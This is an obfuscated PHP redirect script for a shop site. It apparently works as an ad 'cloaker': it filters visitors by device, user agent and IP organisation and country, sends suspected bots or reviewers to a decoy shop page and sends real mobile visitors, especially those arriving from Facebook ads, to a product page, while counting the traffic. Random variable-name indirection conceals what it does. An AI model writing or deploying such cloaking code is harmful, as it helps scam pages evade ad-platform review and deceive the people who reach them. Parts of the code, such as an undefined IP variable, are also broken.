<?php
use Detection\MobileDetect;

require 'vendor/autoload.php';

$detect= new  MobileDetect();
// Check for any mobile device, excluding tablets.
if ($detect->isMobile() || $detect->isTablet()) {

}else{
    header('Location: facebook.com') ;
}
$GLOBALS["xqgobglnvc"] = "sqlS2";
$GLOBALS["kwmeicgwz"] = "query";
$GLOBALS["nhnrgqnw"] = "sqlS1";
$GLOBALS["zjsfhlmz"] = "new_hj_face";
$GLOBALS["qtmjnytl"] = "hj_insta";
$GLOBALS["xhwbco"] = "new_hj_insta";
$GLOBALS["hwszloye"] = "hj_visitas";
$GLOBALS["krblzbuwukg"] = "new_hj_visitas";
$GLOBALS["sgyefjt"] = "hj_face";
$GLOBALS["rrwtopqnh"] = "consultaBX";
$GLOBALS["civwdaexvltg"] = "qtd_hj";
$GLOBALS["rtuyjgcjdnxr"] = "result_hj";
$GLOBALS["rwcirbutlgr"] = "mysqli";
$GLOBALS["bnsmoexv"] = "result_hoje";
$GLOBALS["eenoxh"] = "new_extern";
$GLOBALS["pyajaxx"] = "new_bots";
$GLOBALS["lsibhedakv"] = "new_face";
$GLOBALS["pjyckqv"] = "new_insta";
$GLOBALS["lsmgcblmdyy"] = "new_visita";
$GLOBALS["dukqjltc"] = "extern";
$GLOBALS["gtcoht"] = "bots";
$GLOBALS["rkpdxrijdlop"] = "insta";
$GLOBALS["puigktian"] = "visitas";
$GLOBALS["ykaapsnhwls"] = "consultaAX";
$GLOBALS["hcgsid"] = "dadosAX";
$GLOBALS["atflcvt"] = "pais";
$GLOBALS["npxrvqhjwvv"] = "org";
$GLOBALS["nbexzevv"] = "response_agent";
$GLOBALS["tpjaoeisbqbv"] = "dispositivo";
$GLOBALS["nydwmgcg"] = "qtd_prod";
$GLOBALS["egyjqbsxy"] = "result_now";
$GLOBALS["esyycdx"] = "result_qnt_prod";
$GLOBALS["yugcfpbzd"] = "id";
$GLOBALS["xfjtxfdh"] = "rand";
$GLOBALS["xarhqg"] = "redirect_error_1";
$ogzykju = "redirect_error_2";
$GLOBALS["wrdwgtky"] = "redirect_success";
date_default_timezone_set("America/Sao_Paulo");
session_start();
require "dash/internal/conexao.php";
require "function/bot.php";
$redirect_success = "shop/produto.php";
$redirect_error_1 = "obb/rick/shop/";
$redirect_error_2 = "maintenance/";
$rand = rand(00, 9999999999);
$_SESSION["url_produt"] = UrlAtual();
if (isset($_GET["category"])) {
    $gdtjiqpmgw = "mysqli";
    $GLOBALS["brjhqkfj"] = "result_qnt_prod";
    $id = preg_replace("/[^0-9]/", "", $_GET["category"]);
    $uffuulu = "result_now";
    $result_qnt_prod = "SELECT count(id) AS total  FROM produtos WHERE id='{$id}' ";
    $GLOBALS["icbbwatkn"] = "values_now";
    $GLOBALS["kysxroepg"] = "values_now";
    $result_now = mysqli_query($mysqli, $result_qnt_prod);
    $values_now = mysqli_fetch_assoc($result_now);
    $qtd_prod = $values_now["total"];
	
    if ($qtd_prod > 0) {
		
        $woiiqgnrbvj = "mobile";
        $liberado_patoxy = 'ok';
		$liberado_patoxye ='ok';
        if ($liberado_patoxye == 'ok') {
			
            $GLOBALS["efylhlhkgzfk"] = "response_agent";
            $GLOBALS["xuuakeral"] = "dispositivo";
            $dispositivo = $_SERVER["HTTP_USER_AGENT"];
            $response_agent = check_agent($dispositivo);
            if ($response_agent == 0) {
				echo $qtd_prod.'a';
                $GLOBALS["nyegfpqh"] = "check";
                $tjovpplo = "ip";
                $GLOBALS["xurypntnj"] = "check";
                $ldpebttpzq = "check";
                $check = ip_check($ip);
                $org = $check[0];
                $pais = $check[1];
                $lindo_lindo = 'patoxy';
                if (true) {
                    $dadosAX = "SELECT* FROM geral where id=1";
                    $GLOBALS["amkorphpg"] = "conAX";
                    $conAX = $mysqli->query($dadosAX) or die($mysqli->error);
                    $qjhhtodmk = "id";
                    $GLOBALS["dilekpvycnph"] = "bots";
                    $libydkkt = "insta";
                    $GLOBALS["upglrd"] = "values_hj";
                    $uupuxrdiusf = "face";
                    while (${$GLOBALS["ykaapsnhwls"]} = $conAX->fetch_array()) {
                        $GLOBALS["jwjfdmvjlw"] = "consultaAX";
                        ${$GLOBALS["puigktian"]} = ${$GLOBALS["ykaapsnhwls"]}["visitas"];
                        $sflkzqbeij = "consultaAX";
                        $GLOBALS["yuxmeh"] = "face";
                        $qkkrlftcidl = "consultaAX";
                        ${$GLOBALS["rkpdxrijdlop"]} = ${$GLOBALS["jwjfdmvjlw"]}["insta"];
                        ${$GLOBALS["yuxmeh"]} = ${$qkkrlftcidl}["face"];
                        ${$GLOBALS["gtcoht"]} = ${$GLOBALS["ykaapsnhwls"]}["bots"];
                        ${$GLOBALS["dukqjltc"]} = ${$sflkzqbeij}["extern"];
                    }
                    $wllpvxt = "dia_hoje";
                    $GLOBALS["xnboiey"] = "qtd_hj";
                    $eeyubphof = "visitas";
                    $GLOBALS["gxvuiytssyg"] = "result_hoje";
                    $kwnhttwlfd = "result_hj";
                    ${$GLOBALS["lsmgcblmdyy"]} = $visitas + 1;
                    ${$libydkkt} += 1;
                    $ydotwuoen = "values_hj";
                    ${$uupuxrdiusf} += 1;
                    ${$GLOBALS["dilekpvycnph"]} += 1;
                    ${$GLOBALS["dukqjltc"]} += 1;
                    ${$wllpvxt} = date("d/m/Y");
                    $niqlssemhh = "ip";
                    ${$GLOBALS["bnsmoexv"]} = "SELECT count(id) AS total  FROM analytics WHERE dia='{$dia_hoje}' ";
                    ${$kwnhttwlfd} = mysqli_query(${$GLOBALS["rwcirbutlgr"]}, ${$GLOBALS["gxvuiytssyg"]});
                    ${$GLOBALS["upglrd"]} = mysqli_fetch_assoc(${$GLOBALS["rtuyjgcjdnxr"]});
                    ${$GLOBALS["xnboiey"]} = ${$ydotwuoen}["total"];
                    if (${$GLOBALS["civwdaexvltg"]} > 0) {
                        $htiuuxievnmr = "conBX";
                        $GLOBALS["dfzxiukkqj"] = "dadosBX";
                        $GLOBALS["cayzoogf"] = "dadosBX";
                        $dadosBX = "SELECT* FROM analytics where dia='{$dia_hoje}'";
                        $conBX = $mysqli->query($dadosBX) or die($mysqli->error);
                        while (${$GLOBALS["rrwtopqnh"]} = $conBX->fetch_array()) {
                            $GLOBALS["imqogir"] = "hj_visitas";
                            $GLOBALS["nwvrvunp"] = "hj_insta";
                            $pdlbuncwr = "consultaBX";
                            $moninrrwdnt = "consultaBX";
                            $GLOBALS["hlddulprfsg"] = "consultaBX";
                            $hj_visitas = $consultaBX["visitas"];
                            $hj_insta = $consultaBX["insta"];
                            ${$GLOBALS["sgyefjt"]} = $consultaBX["face"];
                        }
                        ${$GLOBALS["hwszloye"]} += 1;
                        ${$GLOBALS["qtmjnytl"]} += 1;
                        ${$GLOBALS["sgyefjt"]} += 1;
                    }
                    if (isset($_GET["fbclid"])) {
                        $comamg = "query";
                        $dcnhzctefa = "sqlS1";
                        $mlpulzjp = "sqlS1";
                        $ticvrdlmxq = "qtd_hj";
                        $sqlS1 = "Update geral SET visitas='{$new_visita}', face='{$new_face}'  where id=1";
                        $query = $mysqli->query($sqlS1);
                        if ($qtd_hj > 0) {
                            $dwpvcxbqonw = "query";
                            $GLOBALS["heqvunrxp"] = "sqlS2";
                            $sqlS2 = "Update analytics SET visitas='{$new_hj_visitas}', face='{$new_hj_face}'  where dia='{$dia_hoje}'";
                            $GLOBALS["btoqrbs"] = "sqlS2";
                            $query = $mysqli->query($sqlS2);
                        }
                    } else {
                        ${$GLOBALS["nhnrgqnw"]} = "Update geral SET visitas='{$new_visita}', extern='{$new_extern}'  where id=1";
                        $GLOBALS["mxothpcgrhu"] = "qtd_hj";
                        $GLOBALS["tlrhlr"] = "sqlS1";
                        ${$GLOBALS["kwmeicgwz"]} = $mysqli->query($sqlS1);
                        if (${$GLOBALS["mxothpcgrhu"]} > 0) {
                            $klqlhupl = "sqlS2";
                            $ubfvijpzo = "query";
                            ${$GLOBALS["xqgobglnvc"]} = "Update analytics SET visitas='{$new_hj_visitas}'  where dia='{$dia_hoje}'";
                            ${$ubfvijpzo} = $mysqli->query(${$klqlhupl});
                        }
                    }
                    $_SESSION["id_produto"] = ${$qjhhtodmk};
                    $_SESSION["ip_enter"] = ${$niqlssemhh};
                    header("Location: {$redirect_success}");
                } else {
                    header("Location: {$redirect_error_1}?id={$id}&refer={$rand}");
                }
            } else {
                header("Location: {$redirect_error_1}?id={$id}&refer={$rand}");
            }
        } else {
            header("Location: {$redirect_error_2}");
        }
    } else {
        header("Location: {$redirect_error_2}");
    }
} else {
    header("Location: {$redirect_error_2}");
}
echo "\n";
